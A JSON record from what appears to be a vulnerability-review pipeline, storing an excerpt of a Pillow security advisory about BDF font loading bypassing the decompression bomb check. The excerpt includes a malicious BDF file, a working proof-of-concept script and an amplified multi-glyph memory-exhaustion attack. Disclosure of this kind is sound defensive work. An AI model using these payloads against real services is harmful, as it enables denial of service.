@@ -1,0 +1,77 @@
+{
+  "schema_version": "step7_batch_semantic_source_excerpt_v0.1",
+  "builder_id": "step7_batch_semantic_bridge_v0.1",
+  "case_id": "step7_pillow_ghsa_45hq_cxwh_f6vc",
+  "distribution": "pillow",
+  "vulnerability_id": "GHSA-45hq-cxwh-f6vc",
+  "effective_packet_source": "original_run",
+  "original_source_id": "osvref_github_security_advisory_35b13e20fc2f",
+  "original_source_type": "github_security_advisory_reference",
+  "source_key": "pillow::osvref_github_security_advisory_35b13e20fc2f",
+  "target": {
+    "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc",
+    "repository": "python-pillow/Pillow",
+    "advisory_scope": "repository",
+    "advisory_id": "GHSA-45hq-cxwh-f6vc"
+  },
+  "provenance": {
+    "path": "output/step7_batch_review_v0/shared_cache_v0/github_metadata/pillow_osvref_github_security_advisory_35b13e20fc2f/response.json",
+    "status": "resolved",
+    "expected_sha256": "sha256:e7ba3733e8f66627ac6267147abfef0fdf808cec0c2cfee2ae47d6b061a47e98",
+    "expected_size_bytes": 8848,
+    "verified": true,
+    "actual_sha256": "sha256:e7ba3733e8f66627ac6267147abfef0fdf808cec0c2cfee2ae47d6b061a47e98",
+    "actual_size_bytes": 8848,
+    "cache_metadata_path": "output/step7_batch_review_v0/shared_cache_v0/github_metadata/pillow_osvref_github_security_advisory_35b13e20fc2f/metadata.json",
+    "api_url": "https://api.github.com/repos/python-pillow/pillow/security-advisories/GHSA-45HQ-CXWH-F6VC",
+    "content_parse_status": "resolved"
+  },
+  "selected_units": [
+    {
+      "unit_id": "pillow::osvref_github_security_advisory_35b13e20fc2f::unit_001",
+      "unit_kind": "github_advisory_summary",
+      "text_sha256": "sha256:8bec04ba00fa734db0d96f8a0bd28b9225ef1e75ca7c446e5e08aee6d39fd2b6",
+      "original_size_chars": 114,
+      "selected_size_chars": 114,
+      "truncated": false,
+      "locator": {
+        "json_field": "summary"
+      },
+      "excerpt_sha256": "sha256:8bec04ba00fa734db0d96f8a0bd28b9225ef1e75ca7c446e5e08aee6d39fd2b6",
+      "excerpt": "BdfFontFile`: `Image.new()` called without `_decompression_bomb_check()` — bomb protection bypass via font loading"
+    },
+    {
+      "unit_id": "pillow::osvref_github_security_advisory_35b13e20fc2f::unit_002",
+      "unit_kind": "github_advisory_description",
+      "text_sha256": "sha256:e27c982389f1425f9b158cc8b1e0153f32dcca16952298e63b647642deccf319",
+      "original_size_chars": 4115,
+      "selected_size_chars": 4115,
+      "truncated": false,
+      "locator": {
+        "json_field": "description"
+      },
+      "excerpt_sha256": "sha256:e27c982389f1425f9b158cc8b1e0153f32dcca16952298e63b647642deccf319",
+      "excerpt": "### Summary\r\n`PIL/BdfFontFile.py` `bdf_char()` (lines 84–88) reads the `BBX width height` field from a BDF font file and passes the dimensions directly to `Image.new()` without calling `Image._decompression_bomb_check()`. This completely bypasses Pillow's documented decompression bomb protection.\r\n\r\n`Image.open()` enforces `MAX_IMAGE_PIXELS = 89,478,485` and raises `DecompressionBombError` for images exceeding `2 × MAX = 178,956,970` pixels. The BDF font loading path calls `Image.new()` directly, which only calls `_check_size()` (validates `>= 0`) — no pixel count limit.\r\n\r\n**Vulnerable code (`PIL/BdfFontFile.py` lines 84–88):**\r\n```python\r\n# width, height from attacker-controlled \"BBX width height x y\" line\r\ntry:\r\n    im = Image.frombytes(\"1\", (width, height), bitmap, \"hex\", \"1\")\r\nexcept ValueError:\r\n    # TRIGGERED when BITMAP section is empty (zero hex lines)\r\n    im = Image.new(\"1\", (width, height))   # ← NO _decompression_bomb_check()!\r\n    # ^ This image is stored in self.glyph[ch] — persists in memory\r\n```\r\n\r\n**Attack trigger:** A BDF glyph with `BBX 20000 20000` and an empty `BITMAP` section causes `Image.frombytes()` to raise `ValueError`, then `Image.new(\"1\", (20000, 20000))` allocates **50 MB** of C-heap silently. Image.open() would raise `DecompressionBombError` for the same dimensions.\r\n\r\n## Steps to reproduce\r\n\r\n**Minimal malicious BDF file (270 bytes):**\r\n```\r\nSTARTFONT 2.1\r\nSIZE 16 75 75\r\nFONTBOUNDINGBOX 16 16 0 -4\r\nSTARTPROPERTIES 1\r\nCOMMENT placeholder\r\nENDPROPERTIES\r\nCHARS 1\r\nSTARTCHAR A\r\nENCODING 65\r\nSWIDTH 500 0\r\nDWIDTH 8 0\r\nBBX 20000 20000 0 0\r\nBITMAP\r\nENDCHAR\r\nENDFONT\r\n```\r\n\r\n**Proof of Concept script:**\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"PoC: BdfFontFile bomb bypass — 270-byte BDF → 50 MB allocation\"\"\"\r\nimport io, warnings\r\nwarnings.filterwarnings(\"ignore\")\r\n\r\nfrom PIL.BdfFontFile import BdfFontFile\r\nfrom PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError\r\n\r\nW, H = 20000, 20000   # 400M pixels → above DecompressionBombError threshold\r\n\r\n# Show what Image.open() would do\r\nwarnings.filterwarnings(\"error\", category=DecompressionBombWarning)\r\ntry:\r\n    _decompression_bomb_check((W, H))\r\nexcept (DecompressionBombWarning, DecompressionBombError) as e:\r\n    print(f\"[Image.open() path] BLOCKED by {type(e).__name__}\")\r\nwarnings.filterwarnings(\"ignore\")\r\n\r\n# Malicious BDF: large BBX + empty BITMAP → ValueError → Image.new() without bomb check\r\nbdf = f\"\"\"STARTFONT 2.1\r\nSIZE 16 75 75\r\nFONTBOUNDINGBOX 16 16 0 -4\r\nSTARTPROPERTIES 1\r\nCOMMENT x\r\nENDPROPERTIES\r\nCHARS 1\r\nSTARTCHAR A\r\nENCODING 65\r\nSWIDTH 500 0\r\nDWIDTH 8 0\r\nBBX {W} {H} 0 0\r\nBITMAP\r\nENDCHAR\r\nENDFONT\r\n\"\"\".encode()\r\n\r\nprint(f\"[*] BDF file size  : {len(bdf)} bytes\")\r\nprint(f\"[*] Glyph size     : {W} x {H} = {W*H:,} pixels\")\r\nprint(f\"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)\")\r\n\r\nBdfFontFile(io.BytesIO(bdf))   # No exception — bomb check bypassed!\r\n\r\nprint(f\"[!] CONFIRMED: BdfFontFile loaded silently — {W*H//8//1024**2} MB allocated\")\r\nprint(f\"    Image.open() path would have raised DecompressionBombError\")\r\n```\r\n\r\n**Expected output:**\r\n```\r\n[Image.open() path] BLOCKED by DecompressionBombError\r\n[*] BDF file size  : 270 bytes\r\n[*] Glyph size     : 20000 x 20000 = 400,000,000 pixels\r\n[*] C-heap target  : 47 MB  (mode '1' = 1 bit/pixel)\r\n[!] CONFIRMED: BdfFontFile loaded silently — 47 MB allocated\r\n    Image.open() path would have raised DecompressionBombError\r\n```\r\n\r\n**Amplified attack (multiple glyphs):**  \r\nA BDF file defining 256 glyphs each at `BBX 8000 8000` causes `256 × 7.6 MB = ~1.95 GB` total C-heap allocation — all silently, bypassing documented bomb protection.\r\n\r\n### Impact\r\n- **Availability**: HIGH — attacker-controlled memory allocation per glyph × up to 65,536 glyphs\r\n- **Confidentiality**: None  \r\n- **Integrity**: None\r\n- Any service loading BDF fonts from untrusted sources (e.g., `ImageFont.load(\"user.bdf\")`, `BdfFontFile(fp)`) is affected\r\n- Loaded glyph images persist in `self.glyph[ch]` for the lifetime of the font object — memory is NOT freed until the font is garbage collected\r\n\r\n\r\n"
+    }
+  ],
+  "input_refs": {
+    "semantic_excerpt_bundle": {
+      "path": "output/step7_batch_review_v0/batch_004_semantic_bridge_full56_v1/step7_pillow_ghsa_45hq_cxwh_f6vc/semantic_excerpt_bundle.json",
+      "sha256": "9830709ea0ed57d720c1c0adf5f1fa0423bc2e4791cb827352e61bab498607c6"
+    },
+    "review_packet": {
+      "path": "output/step7_batch_review_v0/batch_004_evidence_full56_v0/review_packets/step7_pillow_ghsa_45hq_cxwh_f6vc/review_packet.json",
+      "sha256": "ee26d8ab98759b122bf10731def0eec0ca27ba09ce4488bc851a5db4e86a2408"
+    }
+  },
+  "semantic_boundary": {
+    "evidence_only": true,
+    "source_partition_preserved": true,
+    "excerpt_is_ground_truth": false,
+    "trigger_truth_created": false,
+    "llm_proposal_created": false,
+    "human_review_created": false,
+    "eligibility_created": false,
+    "package_kb_mutated": false
+  }
+}
